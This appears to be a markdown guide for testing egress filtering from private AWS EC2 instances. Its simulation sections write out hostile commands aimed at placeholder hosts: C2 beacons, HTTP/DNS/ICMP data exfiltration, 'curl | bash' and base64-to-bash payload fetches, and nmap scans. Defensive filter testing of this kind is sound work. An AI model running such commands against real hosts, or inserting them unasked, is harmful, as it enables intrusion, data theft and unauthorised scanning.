# Security Testing Guide for Internet Filtering Capabilities

## Overview
This guide provides commands and scripts to test your internet filtering capabilities from the private EC2 instances.

## EC2 Instances Created
- **Private Instance 1**: `{prefix}-z1-private-test` (us-east-1a)
- **Private Instance 2**: `{prefix}-z2-private-test` (us-east-1b)

## Accessing Private Instances

### Method 1: Session Manager (Recommended)
```bash
# List instances
aws ec2 describe-instances --filters "Name=tag:Category,Values=security-testing" --query 'Reservations[].Instances[].[InstanceId,Tags[?Key==`Name`].Value|[0],State.Name]' --output table

# Connect via Session Manager (no SSH key needed)
aws ssm start-session --target i-INSTANCE_ID
```

### Method 2: SSH via Bastion (Public Instance)
```bash
# SSH to public instance first
ssh -i your-key.pem ubuntu@PUBLIC_INSTANCE_IP

# Then SSH to private instance
ssh ubuntu@PRIVATE_INSTANCE_IP
```

## Pre-installed Testing Scripts

Both private instances have pre-installed scripts:

### Basic Internet Connectivity Test
```bash
# Run the basic internet test
./test_internet.sh
```

### Malicious URL/IP Test
```bash
# Run the malicious content test
./test_malicious.sh
```

## Manual Testing Commands

### 1. Basic Connectivity Tests
```bash
# Test DNS resolution
nslookup google.com
nslookup 8.8.8.8
dig google.com

# Test basic HTTP connectivity
curl -v http://httpbin.org/ip
curl -v https://www.google.com
wget -O - http://httpbin.org/headers

# Test different ports
nc -zv google.com 80
nc -zv google.com 443
nc -zv google.com 22

# Test ping (ICMP)
ping -c 4 8.8.8.8
ping -c 4 google.com
```

### 2. Malicious Domain Testing

#### Known Malicious Test Domains (Safe for Testing)
```bash
# EICAR test file (anti-malware test)
curl -v http://www.eicar.org/download/eicar.com.txt
wget http://www.eicar.org/download/eicar.com.txt

# Google Safe Browsing test URLs
curl -v "http://malware.testing.google.test/testing/malware/"
curl -v "http://testsafebrowsing.appspot.com/s/malware.html"
curl -v "http://testsafebrowsing.appspot.com/s/phishing.html"

# Suspicious TLDs and domains
curl -v "http://suspicious-domain.tk"
curl -v "http://malicious-site.ml"
curl -v "http://bad-domain.ga"
```

#### Command & Control (C&C) Simulation
```bash
# Simulate C&C beacon traffic
curl -v -X POST -H "Content-Type: application/json" \
  -d '{"id":"bot123","status":"alive"}' \
  http://c2-server.example.com/beacon

# IRC-style C&C simulation
nc evil-irc.example.com 6667

# DNS tunneling simulation
nslookup $(echo "secret-data" | base64).tunnel.example.com
```

### 3. Suspicious IP Addresses

#### Known Malicious IPs (for testing)
```bash
# Test connections to suspicious IP ranges
curl -v --connect-timeout 5 http://185.220.101.1  # Tor exit node
curl -v --connect-timeout 5 http://198.51.100.1   # Reserved test IP
curl -v --connect-timeout 5 http://203.0.113.1    # Reserved test IP

# Test non-standard ports
nc -zv 185.220.101.1 8080
nc -zv 185.220.101.1 9050  # Tor SOCKS port
nc -zv 192.0.2.1 31337     # Common backdoor port
```

### 4. Data Exfiltration Simulation
```bash
# HTTP POST data exfiltration
curl -v -X POST -d "credit_card=4111111111111111&ssn=123-45-6789" \
  http://data-stealer.example.com/collect

# DNS exfiltration simulation
for i in {1..5}; do
  nslookup "data-chunk-${i}.exfil.example.com"
done

# ICMP exfiltration simulation
ping -c 1 -p $(echo "secret" | xxd -p) data-exfil.example.com

# Large file download simulation
wget --limit-rate=200k http://large-files.example.com/10GB.zip
```

### 5. Protocol-based Testing

#### HTTPS/TLS Testing
```bash
# Test different TLS versions
curl -v --tls-max 1.0 https://badssl.com/
curl -v --tls-max 1.1 https://badssl.com/
openssl s_client -connect badssl.com:443 -tls1

# Certificate validation bypass attempts
curl -k -v https://self-signed.badssl.com/
curl -k -v https://expired.badssl.com/
```

#### FTP Testing
```bash
# Anonymous FTP access
ftp ftp.malicious-site.example.com
# (try anonymous login)

# SFTP/SCP testing
sftp suspicious-server.example.com
scp testfile.txt user@suspicious-server.example.com:/tmp/
```

### 6. Network Scanning Simulation
```bash
# Port scanning (should be blocked by filtering)
nmap -sS -O target.example.com
nmap -sU -p 1-1000 target.example.com
nmap -sT -p 1-65535 target.example.com

# Host discovery
nmap -sn 192.168.1.0/24
nmap -PR 192.168.1.0/24

# Service enumeration
nmap -sV -p 22,80,443 target.example.com
```

### 7. Advanced Persistent Threat (APT) Simulation
```bash
# Multi-stage download
curl -v http://stage1.apt.example.com/payload1 | bash
wget -q -O - http://stage2.apt.example.com/payload2 | sh

# Encoded payload simulation
echo "Y3VybCBodHRwOi8vYXB0LmV4YW1wbGUuY29tL3BheWxvYWQ=" | base64 -d | bash

# Persistence mechanism simulation
curl -v http://persistence.apt.example.com/install_backdoor.sh
```

### 8. Cryptocurrency Mining Simulation
```bash
# Mining pool connections
nc -zv mining-pool.example.com 4444
nc -zv stratum.mining.example.com 3333

# Download mining software
wget http://crypto-miner.example.com/miner.tar.gz
curl -v http://mining-tools.example.com/xmrig
```

## Monitoring Commands

### Check Network Connections
```bash
# Monitor active connections
netstat -tulpn
ss -tulpn

# Monitor network traffic
sudo tcpdump -i any -n 'not port 22'
sudo tcpdump -i any -n 'host suspicious-site.example.com'

# Check DNS queries
sudo tcpdump -i any -n 'port 53'
```

### Log Analysis
```bash
# Check system logs
sudo journalctl -f
sudo tail -f /var/log/syslog

# Check DNS resolution logs
sudo tail -f /var/log/dnsmasq.log  # if dnsmasq is used
```

## Testing Methodology

### 1. Baseline Testing
1. Run basic connectivity tests first
2. Verify internet access works through NAT Gateway
3. Test legitimate websites (google.com, aws.amazon.com)

### 2. Filtering Testing
1. Start with known bad domains
2. Test suspicious IP addresses
3. Try various protocols and ports
4. Test data exfiltration patterns

### 3. Validation
1. Check logs for blocked connections
2. Verify allowed traffic still works
3. Test bypass attempts
4. Document false positives/negatives

## Expected Behavior

### Without Filtering (Baseline)
- All commands should work
- Internet access via NAT Gateway
- No blocked connections

### With Internet Filtering
- Malicious domains should be blocked
- Suspicious IPs should be blocked
- Legitimate traffic should pass through
- Logs should show blocked attempts

## Troubleshooting

### Connection Issues
```bash
# Check routing
ip route show
traceroute google.com

# Check DNS
cat /etc/resolv.conf
systemd-resolve --status

# Check firewall
sudo iptables -L
sudo ufw status
```

### Testing Tools Installation
```bash
# Install additional tools if needed
sudo apt-get update
sudo apt-get install -y \
  nmap ncat socat tcpdump wireshark-common \
  dnsutils bind9-utils curl wget \
  openssl net-tools iproute2
```

## Security Notes

⚠️ **Warning**: These tests simulate malicious activity. Only run in controlled environments.

- Use test domains and IPs when possible
- Don't use actual malicious URLs in production
- Monitor and log all testing activities
- Clean up test files after testing
- Inform security teams about testing activities

## Automation Script

```bash
#!/bin/bash
# comprehensive_security_test.sh

echo "=== Starting Comprehensive Security Test ==="
echo "Date: $(date)"
echo "Instance: $(hostname)"
echo "Private IP: $(hostname -I | awk '{print $1}')"
echo ""

echo "1. Basic connectivity test..."
./test_internet.sh
echo ""

echo "2. Malicious URL test..."
./test_malicious.sh
echo ""

echo "3. Additional network tests..."
echo "Testing suspicious IPs..."
for ip in "185.220.101.1" "198.51.100.1" "203.0.113.1"; do
  echo "Testing $ip..."
  curl -s --connect-timeout 5 http://$ip || echo "Connection to $ip failed/blocked"
done

echo ""
echo "4. Port scanning simulation..."
nmap -sT -p 22,80,443,8080 google.com 2>/dev/null || echo "Port scanning blocked/failed"

echo ""
echo "=== Test Complete ==="
```

Save this as `/home/ubuntu/comprehensive_test.sh` and make it executable:
```bash
chmod +x /home/ubuntu/comprehensive_test.sh
```
